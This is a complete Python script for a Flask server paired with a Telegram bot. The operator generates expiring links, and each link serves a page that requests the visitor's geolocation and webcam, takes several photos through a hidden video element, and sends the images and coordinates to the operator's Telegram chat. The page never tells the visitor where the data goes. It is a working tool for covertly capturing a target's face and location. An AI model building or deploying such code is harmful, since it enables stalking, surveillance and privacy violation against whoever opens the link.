import os
import base64
import re
import threading
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, abort, render_template_string, render_template
from telegram import Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
from telegram import Update, ReplyKeyboardMarkup
import uuid
from dotenv import load_dotenv

bot = Bot(token=os.getenv("BOT_TOKEN"))
chat_id = os.getenv("CHAT_ID")
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
SERVER_URL = os.getenv('SERVER_URL')  # ex: https://tonapp.onrender.com
PORT = int(os.environ.get('PORT', 8080))

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    photo = request.files["photo"]
    photo.save("static/photo.jpg")
    bot.send_photo(chat_id=chat_id, photo=open("static/photo.jpg", "rb"))
    return "OK"
# --- load env ---


if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Il faut définir BOT_TOKEN et CHAT_ID dans l'environnement (.env ou via dashboard).")

# normaliser CHAT_ID
try:
    CHAT_ID = int(CHAT_ID)
except ValueError:
    pass  # peut être un string avec -100...


CAPTURE_DIR = 'captures'
os.makedirs(CAPTURE_DIR, exist_ok=True)

# --- sessions in memory ---
sessions: dict[str, dict] = {}  # token: {camera, num_photos, interval, expire_at}

def cleanup_sessions():
    while True:
        now = datetime.utcnow()
        expired = [k for k, v in list(sessions.items()) if v['expire_at'] < now]
        for k in expired:
            print(f"[+] Session {k} expirée, suppression.")
            del sessions[k]
        import time
        time.sleep(60)

threading.Thread(target=cleanup_sessions, daemon=True).start()

# --- helper ---
def get_server_url():
    if SERVER_URL:
        return SERVER_URL.rstrip('/')
    # tenter autodétection basique sinon fallback
    return os.environ.get('SERVER_URL', f"http://localhost:{PORT}")

# --- Telegram bot conversation states ---
CAMERA, NUM_PHOTOS, INTERVAL, DURATION = range(4)

def start(update: Update, context: CallbackContext):
    reply_keyboard = [['user', 'environment']]
    update.message.reply_text(
        "Choisis la caméra (user=avant, environment=arrière) :",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True))
    return CAMERA

def camera_choice(update: Update, context: CallbackContext):
    cam = update.message.text.strip()
    if cam not in ['user', 'environment']:
        update.message.reply_text("Choix invalide, choisis 'user' ou 'environment'.")
        return CAMERA
    context.user_data['camera'] = cam
    update.message.reply_text("Combien de photos prendre ? (ex: 3)")
    return NUM_PHOTOS

def num_photos_choice(update: Update, context: CallbackContext):
    try:
        n = int(update.message.text.strip())
        if n <= 0 or n > 20:
            update.message.reply_text("Merci d'indiquer un nombre entre 1 et 20.")
            return NUM_PHOTOS
        context.user_data['num_photos'] = n
        update.message.reply_text("Intervalle entre photos (secondes) ? (ex: 2)")
        return INTERVAL
    except:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return NUM_PHOTOS

def interval_choice(update: Update, context: CallbackContext):
    try:
        interval = int(update.message.text.strip())
        if interval <= 0 or interval > 60:
            update.message.reply_text("Merci d'indiquer un intervalle entre 1 et 60 secondes.")
            return INTERVAL
        context.user_data['interval'] = interval
        update.message.reply_text("Durée de validité du lien (minutes) ? (ex: 10)")
        return DURATION
    except:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return INTERVAL

def duration_choice(update: Update, context: CallbackContext):
    try:
        duration = int(update.message.text.strip())
        if duration <= 0 or duration > 120:
            update.message.reply_text("Merci d'indiquer une durée entre 1 et 120 minutes.")
            return DURATION
        context.user_data['duration'] = duration

        token = str(uuid.uuid4())
        expire_at = datetime.utcnow() + timedelta(minutes=duration)
        sessions[token] = {
            'camera': context.user_data['camera'],
            'num_photos': context.user_data['num_photos'],
            'interval': context.user_data['interval'],
            'expire_at': expire_at
        }

        url = f"{get_server_url()}/capture/{token}"
        update.message.reply_text(f"Voici le lien de capture (valide {duration} minutes):\n{url}")
        return ConversationHandler.END
    except Exception:
        update.message.reply_text("Merci d'indiquer un nombre entier.")
        return DURATION

def cancel(update: Update, context: CallbackContext):
    update.message.reply_text("Annulé.")
    return ConversationHandler.END

def start_bot():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('startcapture', start)],
        states={
            CAMERA: [MessageHandler(Filters.text & ~Filters.command, camera_choice)],
            NUM_PHOTOS: [MessageHandler(Filters.text & ~Filters.command, num_photos_choice)],
            INTERVAL: [MessageHandler(Filters.text & ~Filters.command, interval_choice)],
            DURATION: [MessageHandler(Filters.text & ~Filters.command, duration_choice)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    )
    dp.add_handler(conv_handler)
    # Optionnel : commande /status
    def status_cmd(update: Update, context: CallbackContext):
        update.message.reply_text("Bot actif. Sessions ouvertes: " + str(len(sessions)))
    dp.add_handler(CommandHandler('status', status_cmd))

    updater.start_polling(drop_pending_updates=True)
    print("[*] Bot Telegram démarré (polling)")
    try:
        bot.send_message(chat_id=CHAT_ID, text="⚙️ Bot & serveur démarrés (all-in-one).")
    except Exception as e:
        print(f"[!] Impossible d'envoyer message de démarrage: {e}")
    return updater

# --- Flask HTML template ---
CAPTURE_HTML = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Capture webcam + géoloc</title></head>
<body style="background:#121212;color:#eee;font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif;text-align:center;padding:1rem;">
  <h2 style="margin-top:0;">Capture webcam + géoloc</h2>
  <p>Caméra : <b>{{ camera }}</b></p>
  <p>Photos à prendre : <b>{{ num_photos }}</b></p>
  <p>Intervalle (sec) : <b>{{ interval }}</b></p>
  <p id="status">Demande accès géoloc + webcam...</p>

  <script>
  const camera = "{{ camera }}";
  const numPhotos = parseInt("{{ num_photos }}");
  const interval = parseInt("{{ interval }}");
  let count = 0;

  async function startCapture() {
      if (!navigator.geolocation) {
          alert('Géolocalisation non supportée');
          return;
      }
      navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          try {
              const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camera } });
              const video = document.createElement('video');
              video.style.display = 'none';
              video.srcObject = stream;
              await video.play();

              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              const ctx = canvas.getContext('2d');

              async function takePhoto() {
                  if (count >= numPhotos) {
                      document.getElementById('status').innerText = "Terminé, merci !";
                      stream.getTracks().forEach(track => track.stop());
                      return;
                  }
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  const imageData = canvas.toDataURL('image/png');
                  document.getElementById('status').innerText = `Envoi photo ${count + 1} / ${numPhotos}...`;
                  await fetch('/report/{{ token }}', {
                      method: 'POST',
                      headers: {'Content-Type': 'application/json'},
                      body: JSON.stringify({latitude: lat, longitude: lon, image: imageData})
                  });
                  count++;
                  setTimeout(takePhoto, interval * 1000);
              }
              takePhoto();
          } catch(e) {
              alert('Erreur caméra: ' + e.message);
              document.getElementById('status').innerText = "Erreur caméra";
          }
      }, () => {
          alert('Géoloc refusée');
          document.getElementById('status').innerText = "Géoloc refusée";
      });
  }
  startCapture();
  </script>
</body>
</html>
'''

# --- Flask endpoints ---
@app.route('/capture/<token>')
def capture(token):
    sess = sessions.get(token)
    if not sess:
        abort(404, "Lien invalide ou expiré")
    if sess['expire_at'] < datetime.utcnow():
        del sessions[token]
        abort(410, "Lien expiré")
    return render_template_string(
        CAPTURE_HTML,
        camera=sess['camera'],
        num_photos=sess['num_photos'],
        interval=sess['interval'],
        token=token
    )

@app.route('/report/<token>', methods=['POST'])
def report(token):
    sess = sessions.get(token)
    if not sess or sess['expire_at'] < datetime.utcnow():
        abort(404)
    data = request.get_json(silent=True) or {}
    lat = data.get('latitude')
    lon = data.get('longitude')
    img_data = data.get('image')

    if lat is None or lon is None or not img_data:
        return jsonify({'error': 'données incomplètes'}), 400

    # Envoi texte
    msg = f"📸 Nouvelle capture (session {token}):\nLatitude: {lat}\nLongitude: {lon}"
    try:
        bot.send_message(chat_id=CHAT_ID, text=msg)
    except Exception as e:
        print(f"[!] Erreur envoi message: {e}")

    # Décodage et sauvegarde image
    img_str = re.sub(r'^data:image/.+;base64,', '', img_data)
    try:
        img_bytes = base64.b64decode(img_str)
    except Exception as e:
        print(f"[!] Erreur décodage base64: {e}")
        return jsonify({'error': 'impossible de décoder l\'image'}), 400

    filename = datetime.utcnow().strftime(f'capture_{token}_%Y%m%d_%H%M%S_%f.png')
    filepath = os.path.join(CAPTURE_DIR, filename)
    try:
        with open(filepath, 'wb') as f:
            f.write(img_bytes)
    except Exception as e:
        print(f"[!] Erreur écriture fichier: {e}")
        return jsonify({'error': 'échec sauvegarde image'}), 500

    # Envoi photo au bot
    try:
        with open(filepath, 'rb') as photo_file:
            bot.send_photo(chat_id=CHAT_ID, photo=photo_file)
    except Exception as e:
        print(f"[!] Erreur envoi photo: {e}")

    return jsonify({'status': 'ok'})

# --- Entrée principale ---
if __name__ == '__main__':
    # Démarre le bot en background
    updater = start_bot()
    # Lance Flask
    app.run(host='0.0.0.0', port=PORT, threaded=True)
